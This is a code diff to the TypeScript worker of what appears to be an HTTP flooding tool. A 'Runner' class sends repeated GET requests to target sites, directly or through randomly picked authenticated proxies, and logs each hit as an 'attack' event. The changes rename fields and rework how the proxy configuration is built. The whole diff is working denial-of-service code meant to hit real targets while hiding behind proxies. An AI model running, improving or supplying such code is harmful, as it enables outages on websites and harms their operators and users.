@@ -1,6 +1,7 @@
 import { EventEmitter } from 'events'
 import axios, { AxiosError } from 'axios-https-proxy-fix'
 import { TargetData, ProxyData, SiteData } from './worker.types'
+import { AxiosProxyConfig } from 'axios'
 
 export class Runner {
   private sites: SiteData[]
@@ -48,7 +49,7 @@ export class Runner {
     let directRequest = false
     if (!this.onlyProxy) {
       try {
-        const response = await axios.get(target.site.page, { timeout: 10000 })
+        const response = await axios.get(target.site.url, { timeout: 10000 })
         directRequest = response.status === 200
       } catch (e) {
         console.debug((e as Error).message)
@@ -64,35 +65,28 @@ export class Runner {
       }
       try {
         if (directRequest) {
-          const r = await axios.get(target.site.page, { timeout: 5000, validateStatus: () => true })
-          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
+          const r = await axios.get(target.site.url, { timeout: 5000, validateStatus: () => true })
+          this.eventSource.emit('attack', { url: target.site.url, log: `${target.site.url} | DIRECT | ${r.status}` })
         } else {
           if (proxy === null) {
             proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
           }
-          let proxyObj: any = {}
-          const proxyAddressSplit = proxy.ip.split(':')
-          const proxyIP = proxyAddressSplit[0]
-          const proxyPort = parseInt(proxyAddressSplit[1])
-          proxyObj.host = proxyIP
-          proxyObj.port = proxyPort
-
-          if(proxy.auth) {
-            const proxyAuthSplit = proxy.auth.split(':')
-            const proxyUsername = proxyAuthSplit[0]
-            const proxyPassword = proxyAuthSplit[1]
-            proxyObj.auth = { username: proxyUsername, password: proxyPassword }
-
+          const proxyObj: AxiosProxyConfig = {
+            host: proxy.ip,
+            port: proxy.http_port
           }
 
+          if (proxy.username && proxy.password) {
+            proxyObj.auth = { username: proxy.username, password: proxy.password }
+          }
 
-          const r = await axios.get(target.site.page, {
+          const r = await axios.get(target.site.url, {
             timeout: 10000,
             validateStatus: () => true,
             proxy: proxyObj
           })
 
-          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })
+          this.eventSource.emit('attack', { url: target.site.url, log: `${target.site.url} | PROXY | ${r.status}` })
 
           if (r.status === 407) {
             console.log(proxy)
@@ -106,7 +100,7 @@ export class Runner {
           console.error(e)
         }
 
-        this.eventSource.emit('attack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
+        this.eventSource.emit('attack', { type: 'atack', url: target.site.url, log: `${target.site.url} | ${code}` })
         if (code === 'ECONNABORTED') {
           break
         }
